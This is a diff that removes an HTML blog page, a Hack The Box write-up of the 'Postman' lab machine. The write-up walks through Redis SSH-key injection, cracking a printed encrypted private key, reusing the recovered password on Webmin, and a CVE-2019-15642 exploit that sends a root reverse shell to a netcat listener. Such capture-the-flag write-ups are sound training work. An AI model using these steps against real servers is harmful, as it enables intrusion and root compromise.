@@ -1,489 +1,130 @@
-<!DOCTYPE html>
-<html lang="en-gb"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
-<meta http-equiv="content-type" content="text/html">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title itemprop="name">HTB: Postman | kanyo&#39;s blog</title>
-<meta property="og:title" content="HTB: Postman | kanyo&#39;s blog" />
-<meta name="twitter:title" content="HTB: Postman | kanyo&#39;s blog" />
-<meta itemprop="name" content="HTB: Postman | kanyo&#39;s blog" />
-<meta name="application-name" content="HTB: Postman | kanyo&#39;s blog" />
-<meta property="og:site_name" content="" />
-
-<meta name="description" content="An Easy Linux box where unauthenticated Redis lets you inject an SSH key for a foothold. A cracked SSH key backup from /opt turns out to be Matt&#39;s Webmin password, and CVE-2019-15642 on Webmin 1.910 turns that authenticated session into a root shell.">
-<meta itemprop="description" content="An Easy Linux box where unauthenticated Redis lets you inject an SSH key for a foothold. A cracked SSH key backup from /opt turns out to be Matt&#39;s Webmin password, and CVE-2019-15642 on Webmin 1.910 turns that authenticated session into a root shell." />
-<meta property="og:description" content="An Easy Linux box where unauthenticated Redis lets you inject an SSH key for a foothold. A cracked SSH key backup from /opt turns out to be Matt&#39;s Webmin password, and CVE-2019-15642 on Webmin 1.910 turns that authenticated session into a root shell." />
-<meta name="twitter:description" content="An Easy Linux box where unauthenticated Redis lets you inject an SSH key for a foothold. A cracked SSH key backup from /opt turns out to be Matt&#39;s Webmin password, and CVE-2019-15642 on Webmin 1.910 turns that authenticated session into a root shell." />
-
-<meta property="og:locale" content="en-gb" />
-<meta name="language" content="en-gb" />
-
-  <link rel="alternate" hreflang="en-gb" href="http://localhost:1313/writeups/htb-postman/" title="English" />
-
-
-
-
-
-
-<meta name="generator" content="Hugo 0.161.1">
-
-    
-    <meta property="og:url" content="http://localhost:1313/writeups/htb-postman/">
-  <meta property="og:site_name" content="kanyo&#39;s blog">
-  <meta property="og:title" content="HTB: Postman">
-  <meta property="og:description" content="An Easy Linux box where unauthenticated Redis lets you inject an SSH key for a foothold. A cracked SSH key backup from /opt turns out to be Matt&#39;s Webmin password, and CVE-2019-15642 on Webmin 1.910 turns that authenticated session into a root shell.">
-  <meta property="og:locale" content="en_gb">
-  <meta property="og:type" content="article">
-    <meta property="article:section" content="writeups">
-    <meta property="article:published_time" content="2026-06-08T00:00:00+00:00">
-    <meta property="article:modified_time" content="2026-06-08T00:00:00+00:00">
-    <meta property="article:tag" content="Webmin">
-    <meta property="article:tag" content="Redis">
-    <meta property="article:tag" content="Linux">
-
-
-    
-    
-  <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="HTB: Postman">
-  <meta name="twitter:description" content="An Easy Linux box where unauthenticated Redis lets you inject an SSH key for a foothold. A cracked SSH key backup from /opt turns out to be Matt&#39;s Webmin password, and CVE-2019-15642 on Webmin 1.910 turns that authenticated session into a root shell.">
-
-
-    
-
-    <link rel="canonical" href="http://localhost:1313/writeups/htb-postman/">
-    <link href="/style.min.2dc4fd9484cccdeb4e540eaff87cc3f2c37bacb70d134bbaec04ff76525358fc.css" rel="stylesheet">
-    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
-
-    
-    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
-    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
-    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
-    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
-    <link rel="shortcut icon" href="/favicon.ico">
-
-
-
-
-<link rel="manifest" href="http://localhost:1313/site.webmanifest">
-
-<meta name="msapplication-config" content="/browserconfig.xml">
-<meta name="msapplication-TileColor" content="#2d89ef">
-<meta name="theme-color" content="#434648">
-
-    
-    
-</head>
-<body data-theme = "dark" class="notransition">
-
-<script src="/js/theme.js"></script>
-
-<div class="navbar" role="navigation">
-    <nav class="menu" aria-label="Main Navigation">
-        <a href="http://localhost:1313/" class="logo">
-            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
-viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
-stroke-linejoin="round" class="feather feather-home">
-<title>Home</title>
-<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
-<polyline points="9 22 9 12 15 12 15 22"></polyline>
-</svg>
-        </a>
-        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
-        <label for="menu-trigger">
-            <span class="menu-icon">
-                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
-            </span>
-        </label>
-
-        <div class="trigger">
-            <ul class="trigger-container">
-                
-                
-                <li>
-                    <a class="menu-link " href="/">
-                        Home
-                    </a>
-                    
-                </li>
-                
-                <li>
-                    <a class="menu-link " href="/blogs/">
-                        Blogs
-                    </a>
-                    
-                </li>
-                
-                <li>
-                    <a class="menu-link active" href="/writeups/">
-                        Writeups
-                    </a>
-                    
-                </li>
-                
-                <li>
-                    <a class="menu-link " href="/about/">
-                        About
-                    </a>
-                    
-                </li>
-                
-                <li>
-                    <a class="menu-link " href="https://notes.chaelsoo.me">
-                        Cheatsheet
-                    </a>
-                    
-                </li>
-                
-                <li class="menu-separator">
-                    <span>|</span>
-                </li>
-                
-                
-            </ul>
-            <a id="mode" href="#">
-                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
-<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
-                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
-<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
-            </a>
-        </div>
-    </nav>
-</div>
-
-<div class="wrapper post">
-    <main class="page-content" aria-label="Content">
-        <article>
-            <header class="header">
-                <h1 class="header-title">HTB: Postman</h1>
-                
-                
-                
-                <div class="post-meta">
-                    <time datetime="2026-06-08T00:00:00&#43;00:00" itemprop="datePublished"> 8 Jun 2026 </time>
-                </div>
-                
-            </header>
-            
-            <img src="/images/writeups/htb-postman/htb-postman-pwned.png" alt="HTB: Postman" style="width:100%;border-radius:0.5rem;margin:1.5rem 0;" />
-            
-            <div class="toc-container">
-    <button class="toc-toggle" type="button" onclick="toggleToc()">Table of Contents</button>
-    <div class="toc-content" id="tocContent">
-        <nav id="TableOfContents">
-  <ul>
-    <li><a href="#recon">Recon</a></li>
-    <li><a href="#redis-ssh-key-injection">Redis SSH Key Injection</a></li>
-    <li><a href="#from-redis-to-matt">From redis to Matt</a></li>
-    <li><a href="#cve-2019-15642-webmin-rce">CVE-2019-15642: Webmin RCE</a></li>
-  </ul>
-</nav>
-    </div>
-</div>
-
-<div class="mini-toc" id="miniToc">
-    <div class="mini-toc-header">
-        <div class="mini-toc-title">Contents</div>
-        <button class="mini-toc-minimize" type="button" onclick="toggleMiniToc()" aria-label="Minimize TOC">
-            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 16 16">
-                <path fill-rule="evenodd" d="M1 8a.5.5 0 0 1 .5-.5h13a.5.5 0 0 1 0 1h-13A.5.5 0 0 1 1 8zM7.646 4.146a.5.5 0 0 1 .708 0l2 2a.5.5 0 0 1-.708.708L8.5 5.707V11.5a.5.5 0 0 1-1 0V5.707L6.354 6.854a.5.5 0 1 1-.708-.708l2-2z"/>
-            </svg>
-        </button>
-    </div>
-    <div class="mini-toc-content" id="miniTocContent"></div>
-</div>
-            <div class="page-content">
-                <p>An Easy box that teaches two separate lessons: unauthenticated Redis is a direct shell primitive, and version numbers on admin panels are worth looking up before you give up and move on. The initial nmap scan shows a Webmin instance on port 10000, but it needs credentials. Easy to dismiss and come back to. The full port scan reveals Redis on 6379, no auth, which hands you a foothold as the redis user. From there a backup SSH key in <code>/opt</code> cracks quickly, and that password ends up being exactly what Matt uses to log into Webmin. CVE-2019-15642 on that Webmin version is an authenticated RCE that shells out as root.</p>
-<h2 id="recon">Recon</h2>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/postman ❯ sudo nmap -sV -sC -T4 <span class="nv">$DC</span>
-</span></span><span class="line"><span class="cl">Starting Nmap 7.99 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2026-06-08 19:05 +0100
-</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.129.18.102
-</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.13s latency<span class="o">)</span>.
-</span></span><span class="line"><span class="cl">Not shown: <span class="m">997</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
-</span></span><span class="line"><span class="cl">PORT      STATE SERVICE VERSION
-</span></span><span class="line"><span class="cl">22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
-</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 <span class="o">(</span>RSA<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 <span class="o">(</span>ECDSA<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 <span class="o">(</span>ED25519<span class="o">)</span>
-</span></span><span class="line"><span class="cl">80/tcp    open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: The Cyber Geek<span class="err">&#39;</span>s Personal Website
-</span></span><span class="line"><span class="cl">10000/tcp open  http    MiniServ 1.910 <span class="o">(</span>Webmin httpd<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: MiniServ/1.910
-</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
-</span></span></code></pre></div><p>Three ports. Webmin <code>1.910</code> is an old version. The first thing I looked up was CVE-2019-15642, an authenticated RCE that returns a shell as root. But it needs credentials, so it&rsquo;s a privesc primitive waiting to be used, not an entry point.</p>
-<p><em>Reference: <a href="https://github.com/jas502n/CVE-2019-15642">github.com/jas502n/CVE-2019-15642</a></em></p>
-<p>Port 80 is a static personal page with nothing actionable. Subdomain fuzzing found nothing. The initial scan only shows three ports, so I ran a full port scan while I enumerated what was already visible:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/postman ✗ sudo nmap -sV -sC -T4 -p- <span class="nv">$DC</span>
-</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> postman.htb <span class="o">(</span>10.129.18.102<span class="o">)</span>
-</span></span><span class="line"><span class="cl">NOT shown: <span class="m">65531</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
-</span></span><span class="line"><span class="cl">PORT      STATE SERVICE VERSION
-</span></span><span class="line"><span class="cl">22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
-</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 <span class="o">(</span>RSA<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 <span class="o">(</span>ECDSA<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 <span class="o">(</span>ED25519<span class="o">)</span>
-</span></span><span class="line"><span class="cl">80/tcp    open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: The Cyber Geek<span class="err">&#39;</span>s Personal Website
-</span></span><span class="line"><span class="cl">6379/tcp  open  redis   Redis key-value store 4.0.9
-</span></span><span class="line"><span class="cl">10000/tcp open  http    MiniServ 1.910 <span class="o">(</span>Webmin httpd<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: MiniServ/1.910
-</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
-</span></span></code></pre></div><p>Redis on <code>6379</code>. Version <code>4.0.9</code>, and on HTB boxes Redis this old is almost always unauthenticated.</p>
-<h2 id="redis-ssh-key-injection">Redis SSH Key Injection</h2>
-<p>Redis is an in-memory key-value store. When it&rsquo;s misconfigured without authentication, it exposes two commands that together enable arbitrary file writes anywhere the redis process has write permissions: <code>CONFIG SET dir</code> changes the directory where Redis saves its dump file, and <code>CONFIG SET dbfilename</code> sets the dump file&rsquo;s name. If you set those to point to a user&rsquo;s <code>.ssh/</code> directory and stage a key as a Redis value, saving the database writes your public key into <code>authorized_keys</code>.</p>
-<p>The redis service account on Linux typically has a home directory at <code>/var/lib/redis</code>. That directory usually contains a <code>.ssh/</code> folder. With unauthenticated access, this is a direct foothold.</p>
-<p><em>Reference: <a href="https://github.com/cancela24/Redis-Exploit-Misconfigured-Redis-Server-to-Inject-SSH-Keys">github.com/cancela24/Redis-Exploit-Misconfigured-Redis-Server-to-Inject-SSH-Keys</a></em></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Redis-Exploit-Misconfigured-Redis-Server-to-Inject-SSH-Keys main ✗ python3 poc.py 10.129.18.102 
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Starting Redis exploitation...
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Generating SSH key pair...
-</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> SSH key pair generated successfully.
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Connecting to Redis server at 10.129.18.102...
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Flushing all keys from Redis...
-</span></span><span class="line"><span class="cl">OK
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Uploading public SSH key to Redis...
-</span></span><span class="line"><span class="cl">OK
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Configuring Redis to save keys to /var/lib/redis/.ssh/...
-</span></span><span class="line"><span class="cl">OK
-</span></span><span class="line"><span class="cl">OK
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saving the key to disk on the Redis server...
-</span></span><span class="line"><span class="cl">OK
-</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Public SSH key injected successfully into /var/lib/redis/.ssh/authorized_keys.
-</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> PoC completed. You can manually connect to the server using your private key. ssh -i id_rsa redis@&lt;ip_address&gt;
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/postman ❯ ssh -i id_rsa redis@10.129.18.102
-</span></span><span class="line"><span class="cl">Welcome to Ubuntu 18.04.3 LTS <span class="o">(</span>GNU/Linux 4.15.0-58-generic x86_64<span class="o">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">redis@Postman:~$ ls
-</span></span></code></pre></div><p>Shell as redis.</p>
-<h2 id="from-redis-to-matt">From redis to Matt</h2>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">redis@Postman:/var/www$ whoami
-</span></span><span class="line"><span class="cl">redis
-</span></span><span class="line"><span class="cl">redis@Postman:/var/www$ id
-</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>107<span class="o">(</span>redis<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>114<span class="o">(</span>redis<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>114<span class="o">(</span>redis<span class="o">)</span>
-</span></span><span class="line"><span class="cl">redis@Postman:/var/www$ ls /home
-</span></span><span class="line"><span class="cl">Matt
-</span></span></code></pre></div><p>One user: Matt. Webmin was confirmed running as root:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root        <span class="m">769</span>  0.0  3.1  <span class="m">95204</span> <span class="m">29336</span> ?        Ss   19:04   0:00 /usr/bin/perl /usr/share/webmin/miniserv.pl /etc/webmin/miniserv.conf
-</span></span></code></pre></div><p>Checking common places for interesting files, <code>/opt</code> had something:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">redis@Postman:/$ ls /opt/
-</span></span><span class="line"><span class="cl">id_rsa.bak
-</span></span><span class="line"><span class="cl">redis@Postman:/$ cat /opt/id_rsa.bak 
-</span></span><span class="line"><span class="cl">-----BEGIN RSA PRIVATE KEY-----
-</span></span><span class="line"><span class="cl">Proc-Type: 4,ENCRYPTED
-</span></span><span class="line"><span class="cl">DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
-</span></span><span class="line"><span class="cl">cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
-</span></span><span class="line"><span class="cl">7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
-</span></span><span class="line"><span class="cl">cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
-</span></span><span class="line"><span class="cl">1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
-</span></span><span class="line"><span class="cl">EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
-</span></span><span class="line"><span class="cl">UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
-</span></span><span class="line"><span class="cl">Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
-</span></span><span class="line"><span class="cl">t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
-</span></span><span class="line"><span class="cl">5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
-</span></span><span class="line"><span class="cl">P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
-</span></span><span class="line"><span class="cl">jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
-</span></span><span class="line"><span class="cl">SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
-</span></span><span class="line"><span class="cl">l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
-</span></span><span class="line"><span class="cl">0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
-</span></span><span class="line"><span class="cl">S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
-</span></span><span class="line"><span class="cl">hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
-</span></span><span class="line"><span class="cl">Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
-</span></span><span class="line"><span class="cl">XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
-</span></span><span class="line"><span class="cl">b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
-</span></span><span class="line"><span class="cl">WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
-</span></span><span class="line"><span class="cl">KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
-</span></span><span class="line"><span class="cl">npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
-</span></span><span class="line"><span class="cl">VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
-</span></span><span class="line"><span class="cl">X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw<span class="o">==</span>
-</span></span><span class="line"><span class="cl">-----END RSA PRIVATE KEY-----
-</span></span></code></pre></div><p>An encrypted RSA private key backup. <code>Proc-Type: 4,ENCRYPTED</code> means there&rsquo;s a passphrase. <code>ssh2john</code> extracts a crackable hash, and john cracks it:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/postman ✗ john matt.hash --wordlist<span class="o">=</span>/home/kanyo/tools/wordlists/rockyou.txt
-</span></span><span class="line"><span class="cl">Warning: detected <span class="nb">hash</span> <span class="nb">type</span> <span class="s2">&#34;SSH&#34;</span>, but the string is also recognized as <span class="s2">&#34;ssh-opencl&#34;</span>
-</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
-</span></span><span class="line"><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>SSH <span class="o">[</span>RSA/DSA/EC/OPENSSH <span class="o">(</span>SSH private keys<span class="o">)</span> 32/64<span class="o">])</span>
-</span></span><span class="line"><span class="cl">Cost <span class="m">1</span> <span class="o">(</span>KDF/cipher <span class="o">[</span><span class="nv">0</span><span class="o">=</span>MD5/AES <span class="nv">1</span><span class="o">=</span>MD5/3DES <span class="nv">2</span><span class="o">=</span>Bcrypt/AES<span class="o">])</span> is <span class="m">1</span> <span class="k">for</span> all loaded hashes
-</span></span><span class="line"><span class="cl">Cost <span class="m">2</span> <span class="o">(</span>iteration count<span class="o">)</span> is <span class="m">2</span> <span class="k">for</span> all loaded hashes
-</span></span><span class="line"><span class="cl">Will run <span class="m">20</span> OpenMP threads
-</span></span><span class="line"><span class="cl">Note: This format may emit <span class="nb">false</span> positives, so it will keep trying even after
-</span></span><span class="line"><span class="cl">finding a possible candidate.
-</span></span><span class="line"><span class="cl">computer2008     <span class="o">(</span>matt.bak<span class="o">)</span>
-</span></span></code></pre></div><p>Passphrase: <code>computer2008</code>. This is presumably Matt&rsquo;s key given the filename and the fact that Matt is the only user. Trying SSH with the key:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/postman ✗ ssh -i matt.bak Matt@postman.htb
-</span></span><span class="line"><span class="cl">Enter passphrase <span class="k">for</span> key <span class="s1">&#39;matt.bak&#39;</span>: 
-</span></span><span class="line"><span class="cl">Connection closed by 10.129.18.102 port <span class="m">22</span>
-</span></span></code></pre></div><p>SSH rejected it. The key is valid but Matt&rsquo;s account has SSH access disabled or the authorized_keys doesn&rsquo;t match. One other option: try <code>computer2008</code> as Matt&rsquo;s password on Webmin.</p>
-<h2 id="cve-2019-15642-webmin-rce">CVE-2019-15642: Webmin RCE</h2>
-<p><img src="/images/writeups/htb-postman/web-webmin-login.png" alt="Webmin 1.910 login page at port 10000"></p>
-<p><code>Matt:computer2008</code> worked:</p>
-<p><img src="/images/writeups/htb-postman/web-webmin-matt-dashboard.png" alt="Webmin dashboard logged in as Matt showing Software Package Updates panel with 181 packages"></p>
-<p>Logged in as Matt on Webmin 1.910. CVE-2019-15642 is an authenticated RCE in this version. The vulnerability is in a Perl eval in the package update functionality that doesn&rsquo;t sanitize its input, allowing arbitrary code execution under the account running Webmin, which is root. The original PoC was Python 2, so I ported it to Python 3 and adjusted it to trigger a reverse shell directly:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/postman ✗ python3 webmin_exploit_py3.py --rhost postman.htb --lhost 10.10.16.129 --lport <span class="m">9999</span> -u Matt -p computer2008
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Webmin 1.910 RCE - CVE-2019-15642
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Target: https://postman.htb:10000/
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Auth: Matt:computer2008
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Authenticating...
-</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Got session ID: 13fa100fa711edabd027472b22c5d6e4
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending payload -&gt; 10.10.16.129:9999
-</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Payload sent! Check your listener on port <span class="m">9999</span>
-</span></span><span class="line"><span class="cl">    nc -lvnp <span class="m">9999</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/postman ✗ nc -lvnp <span class="m">9999</span>
-</span></span><span class="line"><span class="cl">Listening on 0.0.0.0 <span class="m">9999</span>
-</span></span><span class="line"><span class="cl">Connection received on 10.129.18.102 <span class="m">39388</span>
-</span></span><span class="line"><span class="cl">id
-</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
